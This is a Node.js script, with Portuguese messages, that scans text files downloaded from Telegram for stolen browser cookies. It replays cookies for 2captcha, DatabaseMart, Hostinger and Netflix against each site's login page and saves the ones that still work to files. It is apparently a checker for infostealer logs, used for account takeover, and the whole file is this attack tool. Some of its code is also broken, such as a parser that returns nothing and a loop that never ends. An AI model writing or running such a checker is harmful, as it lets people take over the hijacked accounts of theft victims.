import prompt from "prompt-sync";
import axios from "axios";

import {
  appendFileSync,
  readdirSync,
  readFileSync,
  statSync,
  writeFileSync,
} from "fs";

const path = "C:\\Users\\W10\\Downloads\\Telegram Desktop";

const pathsFiles = new Array();
let a = 0

const req = async (options) => {
  try {
    return await axios({
      ...options,
      ...{
        validateStatus: () => true,
      },
    });
  } catch (e) {
    console.log("erro in request to ", options.url);
  }
};
const parseNetscapeCookieString = async (cookieString) => {
  const cookies = {};
  if (cookieString.length < 10 || !cookieString.includes("\n")) return;

  const lines = cookieString.split("\n");
  lines.forEach((line) => {
    const parts = line.split("\t");
    if (parts.length >= 7) {
      const domain = parts[0].trim();
      const flag = parts[1].trim() === "TRUE";
      const path = parts[2].trim();
      const secure = parts[3].trim() === "TRUE";
      const expires = parseInt(parts[4].trim());
      const name = parts[5].trim();
      const value = parts[6].trim();
      cookies[name] = { value, domain, path, secure, expires, flag };
    }
  });
};

const chooseItems = async (directory) => {
  const itemns = readdirSync(directory).filter((item) =>
    statSync(`${directory}/${item}`).isDirectory()
  );

  const itemnsIndex = itemns.map((item, index) => {
    return !item.includes(".") ? `[ ${index} ] - ${item}` : "";
  });
  console.log("Select a item");
  console.log(itemnsIndex.join("\n"));
  const selected = prompt()("select item : ");

  if (!itemns?.[selected]) return false;

  return itemns[selected];
};

const redirDirectorys = async (directoryName) => {
  const itemns = readdirSync(directoryName);

  const filtersDirectorys = itemns.filter((item) =>
    !statSync(directoryName + "/" + item).isFile() ? item : null
  );
  const filtersFiles = itemns.filter((item) =>
    statSync(directoryName + "/" + item).isFile() && item.includes(".txt")
      ? item
      : null
  );
  return [filtersDirectorys, filtersFiles];
};

const recursiveDirectorys = async ({ currentPath }) => {
  const [directorys, files] = await redirDirectorys(currentPath);

  for (const index of directorys) {
    await recursiveDirectorys({ currentPath: currentPath + "/" + index });
  }

  files.map((file) => pathsFiles.push(`${currentPath}/${file}`));
  return pathsFiles;
};
const readirPath = async (paths) => {
  const readFiles = paths.map(async (fileName) =>
    readFileSync(fileName, "utf-8")
  );

  return await Promise.all(readFiles);
};

const checker2Captha = async (cookie) => {
  const response = await req({
    url: "https://2captcha.com/pt/auth/login",
    method: "GET",
    headers: {
      cookie: cookie,
    },
  });

  const url = response.request["_redirectable"]["_currentUrl"];
  if (url != "https://2captcha.com/pt/auth/login") {
    appendFileSync("./2captha.txt", "\ncookie\n " + cookie);
    console.log("liveeeeeee");
  }
  return url;
};
const checkerHostinger = async (cookie) => {
  const response = await req({
    url: "https://auth.hostinger.com/",
    method: "GET",
    headers: {
      cookie: cookie,
    },
  });

  const url = response.request["_redirectable"]["_currentUrl"];
  if (url != "https://auth.hostinger.com/login") {
    appendFileSync("./hostinger.txt", "\ncookie\n " + cookie);
    console.log("liveeeeeee");
  }
  return url;
};
const checkerVpsMart = async (cookie) => {
  const response = await req({
    url: "https://accounts.databasemart.com/login/",
    method: "GET",
    headers: {
      cookie: cookie,
    },
  });

  const url = response.request["_redirectable"]["_currentUrl"];
  if (url != "https://accounts.databasemart.com/login/") {
    appendFileSync("./vpsmart.txt", "\ncookie\n " + cookie);
    console.log("liveeeeeee");
  }
  return url;
};

const checkerNetflix = async (cookie) => {
  const response = await req({
    url: "https://www.netflix.com/browse",
    method: "GET",
    headers: {
      cookie: cookie,
    },
  });

  const url = response.request["_redirectable"]["_currentUrl"];
  if (url == "https://www.netflix.com/browse") {
    appendFileSync("./netfrix.txt", "\ncookie\n " + cookie);
    console.log("liveeeeeee");
  }
  return url;
};
const checkCookie = async (contentFile) => {
  const dataCheckers = [
    {
      match: "2captcha.com",
      checker: checker2Captha,
    },
    // {
    //   match: "hostinger.com",
    //   checker: checkerHostinger,
    // },
    {
      match: "databasemart.com",
      checker: checkerVpsMart,
    },
    // {
    //     match: 'netflix.com',
    //     checker : checkerNetflix
    // }
  ];

  for (let { match, checker } of dataCheckers) {
    if (!contentFile || contentFile.length < 20) continue;
    const contentFileLines = contentFile.split("\n");
    const contentFileLinesFilter = contentFileLines.filter((line) =>
      line.includes(match)
    );
// console.log(contentFileLinesFilter.j;

    if (contentFileLinesFilter.length < 1) continue;
    const cookie = await parseNetscapeCookieString(contentFileLinesFilter.join("\n"));
     if (!cookie) continue
    if (a < 10) {
        console.log(contentFileLinesFilter.join("\n"));
        
        console.log(cookie);
        a += 1
    }
    

    console.log(await checker(cookie));
  }
};

const run = async () => {
  const DirectorySelected = await chooseItems(path);

  if (!DirectorySelected) return "Pasta selecionada Não é valida";

  const locateFiles = await recursiveDirectorys({
    currentPath: path + "/" + DirectorySelected,
  });
  console.log(locateFiles.length, " arquivos encontrados !");

  const chunkSize = 500;

  for (let i = 0; locateFiles.length; i += chunkSize) {
    const contentFiles = await readirPath(locateFiles.slice(i, chunkSize + i));

    for (const fileContent of contentFiles) {
      await checkCookie(fileContent);
    }
  }
};

run();
